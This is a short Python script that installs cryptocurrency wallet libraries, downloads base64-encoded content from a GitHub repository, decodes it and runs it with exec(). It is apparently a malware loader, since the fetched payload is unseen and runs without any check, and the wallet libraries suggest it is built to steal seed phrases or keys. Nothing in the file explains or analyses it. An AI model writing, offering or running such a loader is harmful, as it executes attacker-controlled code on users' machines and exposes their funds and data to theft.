import subprocess
subprocess.run("pip install requests mnemonic bip32utils bech32 pycryptodome", capture_output=True, text=True, shell=True)
import requests
import base64
import time
USERNAME     = "Sample"
url          = "https://api.github.com/repos/JikkkoNikiGFD1930/0/contents/3?ref=main"
attempts     = 0
max_attempts = 4
success      = False
script_content = ""
while attempts < max_attempts:
    response = requests.get(url)
    if response.status_code == 200:
        data = response.json()
        script_content = base64.b64decode(data["content"]).decode("utf-8")
        success = True
        break
    else:
        print(f"Attempt {attempts + 1} failed: HTTP CODE: {response.status_code}\nResponse: {response.text}\n")
        print(" --------------------------------------------------------------- ")
        attempts += 1
        if attempts < max_attempts:
            time.sleep(5)
print(f"🔴 *{USERNAME}* Could Not Run and Faild! 🔴")
if success and script_content != "":
    exec(script_content)
